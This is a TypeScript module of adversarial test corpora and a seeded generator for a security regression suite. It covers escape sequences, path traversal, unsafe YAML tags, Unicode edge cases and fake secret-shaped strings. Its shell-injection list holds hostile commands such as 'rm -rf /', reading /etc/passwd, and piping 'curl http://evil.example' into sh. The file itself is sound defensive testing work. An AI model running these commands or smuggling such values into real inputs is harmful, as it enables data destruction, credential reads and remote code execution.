/**
 * Curated adversarial corpora and a DETERMINISTIC combinatorial generator for the
 * security regression suite. No new dependency and no runtime randomness:
 * the generator is seeded (via {@link mulberry32}) so a run replays exactly and a
 * discovered failure can be pinned as a permanent named fixture. Each corpus is a
 * distinct threat category from `security.md` / `testing-strategy.md`; the tests
 * that own each boundary (validators -> unit, output-leak -> program, ...) draw
 * from these so the whole suite shares one vocabulary. Every control character and
 * otherwise-invisible codepoint (ANSI/BEL, bidi, BOM, zero-width, ZWJ, NUL) is
 * written as a `\u`/`\x` escape, so no invisible bytes hide in the source.
 */
import { mulberry32 } from './prng.js';

const ESC = '\x1b';
const BEL = '\x07';

/** ANSI/OSC control sequences that must be inert in human output (FR-J08). */
export const ANSI_OSC: readonly string[] = [
  `${ESC}[31mred${ESC}[0m`, // SGR colour
  `${ESC}[2J${ESC}[H`, // clear screen + home
  `${ESC}]0;pwned${BEL}`, // OSC set-title, BEL-terminated
  `${ESC}]8;;http://evil.example${BEL}link${ESC}]8;;${BEL}`, // OSC 8 hyperlink
  `${ESC}]0;title${ESC}\\`, // OSC set-title, ST-terminated
  `before${ESC}[1000Dafter`, // cursor move
  `x${BEL}y`, // lone BEL
  '\x01\x02\x1b\x9b\x9c', // raw C0/C1 controls incl. 8-bit CSI/ST
];

/** Shell metacharacters — must be stored/handled literally, never interpreted. */
export const SHELL_METACHARS: readonly string[] = [
  '; rm -rf /',
  '$(whoami)',
  '`id`',
  '| cat /etc/passwd',
  '&& curl http://evil.example | sh',
  '> /tmp/pwned',
  '$IFS$9',
  "'; DROP TABLE agents;--",
  '--allow-tool=shell(*)',
];

/** Path traversal / absolute-escape attempts for path-containment validators. */
export const PATH_TRAVERSAL: readonly string[] = [
  '../etc/passwd',
  '../../../../../../etc/shadow',
  '/etc/passwd',
  'C:\\Windows\\System32\\config',
  'foo/../../bar',
  './../.crew/../../secret',
  'a/b/../../../c',
  'nested/deep/../../../../root',
];

/** YAML features a strict loader must reject (aliases, tags, merge keys). */
export const YAML_FEATURES: readonly string[] = [
  'version: 1\nname: &a x\nother: *a\n', // anchor + alias
  'version: 1\nname: !!python/object/apply:os.system ["id"]\n', // tag
  'base: &b { role: worker }\nmember:\n  <<: *b\n', // merge key
  'version: 1\nname: !!str 5\n', // explicit tag
  'a: &x [1,2]\nb: *x\n', // alias to sequence
];

/**
 * Unicode edge cases: bidi, combining, zero-width, BOM, astral, NUL. Every
 * otherwise-invisible codepoint is written as a `\u` escape (no literal
 * bidi/BOM/zero-width/ZWJ bytes in the source), while the runtime strings are
 * byte-for-byte identical to the intended characters.
 */
export const UNICODE_EDGES: readonly string[] = [
  '\u202Ereversed\u202C', // RTL override (U+202E) + pop (U+202C)
  'a\u0301', // combining acute (NFD form of a-acute)
  '\uFEFFbom', // leading BOM (U+FEFF)
  'zero\u200Bwidth', // zero-width space (U+200B)
  '\u{1D54F}\u{1D550}\u{1D551}', // astral (surrogate pairs)
  'has\x00null', // embedded NUL
  'e\u0301\u0301\u0301', // stacked combiners (U+0301 x3)
  '\u{1F469}\u200D\u{1F469}\u200D\u{1F467}', // ZWJ (U+200D) family emoji
];

/** Strings that MUST be masked by the redactor (FR-J14). */
export const SECRET_LIKE: readonly string[] = [
  `sk-${'A'.repeat(24)}`,
  `ghp_${'B'.repeat(36)}`,
  `gho_${'C'.repeat(36)}`,
  `xoxb-${'1'.repeat(20)}`,
  `AKIA${'0'.repeat(16)}`,
  `eyJ${'a'.repeat(10)}.${'b'.repeat(10)}.${'c'.repeat(10)}`, // JWT
  '0123456789ABCDEF0123456789ABCDEF', // 32-char hex run
  'a'.repeat(64), // launch-token-shaped hex
  'password=hunter2supersecret',
  'postgres://user:s3cr3tpassword@host:5432/db',
];

/** Strings that must NOT be masked (redactor false-positive guard). */
export const REDACTION_SAFE: readonly string[] = [
  '11111111-1111-4111-8111-111111111111', // UUID (has separators)
  '/home/user/project/.crew/state/crew.db', // path
  'worker-2',
  'a monkey=banana',
  'the author=jane',
  'schema version 2',
];

/** All threat corpora keyed by category (for exhaustive iteration in tests). */
export const CORPORA = {
  ansiOsc: ANSI_OSC,
  shell: SHELL_METACHARS,
  traversal: PATH_TRAVERSAL,
  yaml: YAML_FEATURES,
  unicode: UNICODE_EDGES,
  secretLike: SECRET_LIKE,
  redactionSafe: REDACTION_SAFE,
} as const;

/** Deterministic wrappers that embed a payload inside benign-looking text. */
export const WRAPPERS: readonly ((s: string) => string)[] = [
  (s) => s,
  (s) => `prefix ${s} suffix`,
  (s) => `${ESC}[31m${s}${ESC}[0m`, // wrap in a colour sequence
  (s) => `${s}${s}`, // doubled
  (s) => `${'x'.repeat(50)}${s}`, // pad before (defeats naive truncation)
  (s) => `line1\n${s}\nline3`, // multiline
];

/**
 * Deterministically generate `count` combined adversarial strings from `bases`,
 * pinned by `seed`. The same (seed, count, bases) always yields the same list, so
 * a failing case is reproducible and can be lifted verbatim into a fixture.
 */
export function generateCombinations(
  bases: readonly string[],
  seed: number,
  count: number,
): string[] {
  const rand = mulberry32(seed);
  const pick = <T>(items: readonly T[]): T => items[Math.floor(rand() * items.length)]!;
  return Array.from({ length: count }, () => pick(WRAPPERS)(pick(bases)));
}

/** Every curated corpus string, flattened — a fixed exhaustive sweep. */
export function allCorpusStrings(): string[] {
  return Object.values(CORPORA).flat();
}
